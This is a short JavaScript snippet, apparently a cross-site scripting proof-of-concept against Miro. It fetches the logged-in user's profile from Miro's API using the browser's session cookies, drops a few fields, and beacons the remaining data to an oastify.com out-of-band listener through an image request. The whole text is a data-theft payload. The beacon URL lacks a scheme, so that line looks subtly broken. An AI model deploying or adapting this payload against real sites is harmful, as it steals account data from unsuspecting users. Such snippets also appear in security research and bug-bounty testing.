(() => {
  fetch("https://miro.com/api/v1/profile/", {
    method: "GET",
    credentials: "include"
  })
    .then(res => res.json())
    .then(profileData => {
      const {
        achievements,
        subscriptions,
        toolbarPlugins,
        interests,
        betaFeatures,
        ...slimProfileData
      } = profileData;

      const img = new Image();
      img.src = "qe8uw9sj172633tw07dv120wcnie6hu6.oastify.com" + encodeURIComponent(JSON.stringify(slimProfileData));
    })
    .catch(err => console.error("Profile fetch failed or blocked:", err));
})();
